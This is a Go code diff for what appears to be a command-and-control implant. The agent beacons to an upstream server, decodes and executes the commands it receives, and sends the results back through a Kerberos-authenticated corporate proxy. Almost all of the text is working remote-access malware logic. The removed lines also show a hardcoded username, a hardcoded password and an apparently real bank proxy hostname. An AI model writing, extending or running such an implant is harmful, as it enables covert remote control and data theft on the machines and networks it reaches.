@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -18,10 +17,8 @@ import (
 	"redbull/internal/rbkrb"
 )
 
-var USERNAME = "zkokkdc"
-var PASSWORD = "foobar"
 var UPSTREAM = "http://localhost:8000"
-var PROXY_URL = "http://abproxy.bankofamerica.com:8080"
+var PROXY_URL = "http://PROXY_HERE:8080"
 var USE_KRB = true
 var SLEEP_TIME = 1 * time.Second
 var CWD = ""
@@ -67,8 +64,11 @@ func changeDirectory(command string) (string, string, error) {
 	return fmt.Sprintf("changed directory to %s", CWD), "", nil
 }
 
-func listDirectory(_ string) (string, string, error) {
-	files, err := os.ReadDir(CWD)
+func listDirectory(path string) (string, string, error) {
+	if path == "" {
+		path = CWD
+	}
+	files, err := os.ReadDir(path)
 	if err != nil {
 		return "", "", fmt.Errorf("failed to read directory %s: %w", CWD, err)
 	}
@@ -122,11 +122,7 @@ func main() {
 
 	var httpClient rbhttp.HttpClient
 	if USE_KRB {
-		var err error
-		httpClient, err = rbkrb.NewProxyAwareHttpClient(PROXY_URL, PASSWORD)
-		if err != nil {
-			panic(err)
-		}
+		httpClient = rbkrb.NewKrbCurlHttpClient(PROXY_URL)
 	} else {
 		httpClient = rbhttp.NewSimpleHttpClient()
 	}
@@ -138,25 +134,12 @@ func main() {
 		default:
 			time.Sleep(SLEEP_TIME)
 
-			resp, err := httpClient.Get(UPSTREAM)
+			resp, err := rbhttp.Get[rbhttp.CheckInResponse](httpClient, UPSTREAM)
 			if err != nil {
 				continue
 			}
 
-			if resp.StatusCode != 200 {
-				resp.Body.Close()
-				continue
-			}
-
-			var checkIn rbhttp.CheckInResponse
-			if err := json.NewDecoder(resp.Body).Decode(&checkIn); err != nil {
-				resp.Body.Close()
-				sendResult(httpClient, "", "", err.Error())
-				continue
-			}
-			resp.Body.Close()
-
-			decoded, err := base64.StdEncoding.DecodeString(checkIn.Command)
+			decoded, err := base64.StdEncoding.DecodeString(resp.Command)
 			if err != nil {
 				sendResult(httpClient, "", "", err.Error())
 				continue
@@ -182,18 +165,8 @@ func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
 		CurrentDirectory: CWD,
 	}
 
-	jsonBytes, err := json.Marshal(result)
+	_, err := rbhttp.Post[any](httpClient, UPSTREAM, result)
 	if err != nil {
-		result = rbhttp.HttpBody{
-			Command:          command,
-			Stdout:           "error: failed to marshal response",
-			Stderr:           fmt.Sprintf("error: %s", err.Error()),
-			CurrentDirectory: CWD,
-		}
-		jsonBytes, err = json.Marshal(result)
-		if err != nil {
-			panic(err)
-		}
+		_ = err
 	}
-	httpClient.Post(UPSTREAM, "application/json", bytes.NewReader(jsonBytes))
 }
